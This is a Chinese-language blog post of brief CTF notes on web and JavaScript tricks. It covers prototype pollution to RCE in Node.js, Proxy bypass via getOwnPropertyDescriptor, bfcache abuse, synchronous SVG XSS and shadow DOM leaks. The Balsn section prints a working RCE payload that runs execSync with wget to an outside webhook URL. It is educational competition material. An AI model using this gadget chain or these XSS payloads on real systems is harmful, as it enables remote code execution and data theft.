---
title: 幾個與 Web 跟 JS 相關的 CTF 題目小記
catalog: true
date: 2022-12-08 20:10:44
tags: [Security]
categories: [Security]
photos: /img/ctf-js-notes/cover.png
---

前陣子有幾個 CTF 都很不錯，像是 SECCON 跟 HITCON，但可惜我前陣子剛好出國玩了，回來以後就懶得寫完整 writeup 了。原本其實連記下來都懶得記，可是一旦時間久了，要找相關的資料就會變得很難找，所以還是決定簡單記一下。

除此之外，順便記一下幾題我覺得以前應該要記下來，但不知道為什麼卻沒記下來的題目。

關鍵字：

1. Node.js prototype pollution gadget to RCE (Balsn CTF 2022 - 2linenodejs)
2. 取得 JS proxy 的原始值 (corCTF 2022 - sbxcalc)
3. 瀏覽器 back 行為的 cache (SECCON CTF 2022 - spanote)
4. 利用 svg 做出同步的 XSS (HITCON CTF 2022)
5. 讀到 shadow DOM 的資料 (HITCON CTF 2022)

<!-- more -->

## Balsn CTF 2022 - 2linenodejs

程式碼十分簡單：

``` js
#!/usr/local/bin/node
process.stdin.setEncoding('utf-8');
process.stdin.on('readable', () => {
  try{
    console.log('HTTP/1.1 200 OK\nContent-Type: text/html\nConnection: Close\n');
    const json = process.stdin.read().match(/\?(.*?)\ /)?.[1],
    obj = JSON.parse(json);
    console.log(`JSON: ${json}, Object:`, require('./index')(obj, {}));
  }catch (e) {
    require('./usage')
  }finally{
    process.exit();
  }
});

// index
module.exports=(O,o) => (
    Object.entries(O).forEach(
        ([K,V])=>Object.entries(V).forEach(
            ([k,v])=>(o[K]=o[K]||{},o[K][k]=v)
        )
    ), o
);
```

很明顯有個 prototype pollution 的洞，因此這題考的就是你在 node.js 有了 prototype pollution 以後，要怎麼弄到 RCE。

這邊還有一個關鍵是 catch 裡面的 `require('./usage')`

最後一個關鍵是這篇論文：[Silent Spring: Prototype Pollution Leads to Remote Code Execution in Node.js](https://arxiv.org/abs/2207.11171)，裡面提到很多從原型污染打到 RCE 的案例，然後都有附上 gadget 或是一些提示。

不過論文裡的其中一個洞在這題用的版本已經被修掉了：https://github.com/nodejs/node/blob/v18.8.0/lib/internal/modules/cjs/loader.js#L484

``` js
const { 1: name, 2: expansion = '' } =
    RegExpPrototypeExec(EXPORTS_PATTERN, request) || kEmptyObject;
```

kEmptyObject 是 `ObjectFreeze(ObjectCreate(null))`，所以不會被污染了。

但總之在檔案裡面繼續找一找，就會發現另一個 `trySelf` 的 function 有同個問題，在這裏：https://github.com/nodejs/node/blob/c200106305f4367ba9ad8987af5139979c6cc40c/lib/internal/modules/cjs/loader.js#L454

``` js
const { data: pkg, path: pkgPath } = readPackageScope(parentPath) || {};
```

這邊預設值也用了 `{}`，所以可以透過原型污染去干擾這些值。

下面這一段程式碼，會去載入 `./pwn.js` 而不是 `./usage.js`：

``` js
Object.prototype["data"] = {
  exports: {
    ".": "./pwn.js"
  },
  name: './usage.js'
}
Object.prototype["path"] = './'

require('./usage.js')
```

因此透過原型污染，可以達成 require 任意文件。接下來的任務就是去找出哪個內建文件有可以使用的 payload，隊友找到 `/opt/yarn-v1.22.19/preinstall.js`，最後長這樣：

```js
Object.prototype["data"] = {
  exports: {
    ".": "./preinstall.js"
  },
  name: './usage'
}
Object.prototype["path"] = '/opt/yarn-v1.22.19'
Object.prototype.shell = "node"
Object.prototype["npm_config_global"] = 1
Object.prototype.env = {
  "NODE_DEBUG": "console.log(require('child_process').execSync('wget${IFS}https://webhook.site/a0beafdc-df63-4804-85a8-7945ad473bf5?q=2').toString());process.exit()//",
  "NODE_OPTIONS": "--require=/proc/self/environ"
}

require('./usage.js')
```

別人寫的 writeup：

1. https://ctf.zeyu2001.com/2022/balsnctf-2022/2linenodejs
2. [Node.js require() RCE复现](https://hujiekang.top/2022/10/11/NodeJS-require-RCE/)

### corCTF 2022 - sbxcalc

這題最核心的部分可以看成是這樣：

``` js
var p = new Proxy({flag: window.flag || 'flag'}, {
  get: () => 'nope'
})
```

試問要怎麼拿到被 proxy 擋住的 flag？

答案是 `Object.getOwnPropertyDescriptor`。

`Object.getOwnPropertyDescriptor(p, 'flag')`，這樣就可以拿到原始的值，而不是 proxy 處理後的東西。

作者 writeup: https://brycec.me/posts/corctf_2022_challenges#sbxcalc

### SECCON CTF 2022 Quals - spanote

Chrome 裡面有一種 cache 叫做 back/forward cache，簡稱 bfcache，這詞我還是第一次聽到：https://web.dev/i18n/en/bfcache/

第二個 disk cache 應該大家都比較熟悉了，fetched resourced 會存在裡面。

利用這個 bfcache，可以做出很有趣的行為。

現在有一個 API 是這樣：

``` js
fastify.get("/api/notes/:noteId", async (request, reply) => {
  const user = new User(request.session.userId);
  if (request.headers["x-token"] !== hash(user.id)) {
    throw new Error("Invalid token");
  }
  const noteId = validate(request.params.noteId);
  return user.sendNote(reply, noteId);
});
```

雖然是個 GET，但是會檢查 custom header，因此照理來說直接用瀏覽器訪問是看不了的。

但是搭配剛剛講到的 cache 行為，你可以：

1. 用瀏覽器打開 `/api/notes/id`，出現錯誤畫面
2. 用同一個 tab 去到首頁，此時首頁會用 fetch 搭配 custom header 去抓 `/api/notes/id`，瀏覽器會把結果存在 disk cache 內
3. 上一頁，此時畫面會顯示 disk cache 的結果

就可以用瀏覽器直接瀏覽 cached response，繞過了 custom header 的限制。

整題更詳細的 writeup 可以看這邊：https://blog.arkark.dev/2022/11/18/seccon-en/#web-spanote

### HITCON CTF 2022

先貼一下 maple 跟 splitline 的 writeup：

1. https://github.com/maple3142/My-CTF-Challenges/tree/master/HITCON%20CTF%202022
2. https://blog.splitline.tw/hitcon-ctf-2022/

這次只有稍微看了一下 Self Destruct Message 那一題，簡單講一下幾個考點。

第一個是執行 `element.innerHTML = str` 的時候，通常 HTML 裡面有什麼東西都會是非同步執行，例如說：

```js
element.innerHTML = '<img src=x onerror=console.log(1)>'
console.log(2)
```

絕對是先 log 2 再來才是 1。

但如果你這樣子寫：

```js
const div = document.createElement('div')
div.innerHTML = '<svg><svg onload=console.log(1)>'
console.log(2)
```

就會很神奇的變成 1 在前面，而且這個 div 甚至不需要放到 DOM 裡面也會有作用。相關的討論可以看這一串：https://twitter.com/terjanq/status/1421093136022048775

再來就是可以利用 error stack 去找出原本的 location，拿到 flag id：

``` js
window.addEventListener('unhandledrejection', e => {
	console.log(e.reason.stack.match(/\/message\/(\w+)/)[1]);
});
```

然後這題也有別的解法，雖然說元素是放在 shadow DOM 裡面，但是可以透過一些 xsleak 去偷出 flag，更完整的研究在這邊：[The Closed Shadow DOM](https://blog.ankursundara.com/shadow-dom/)

類似題目有出現在 DiceCTF 2022，我有寫過一篇心得但是那時候還沒開始標關鍵字：https://blog.huli.tw/2022/02/08/what-i-learned-from-dicectf-2022/



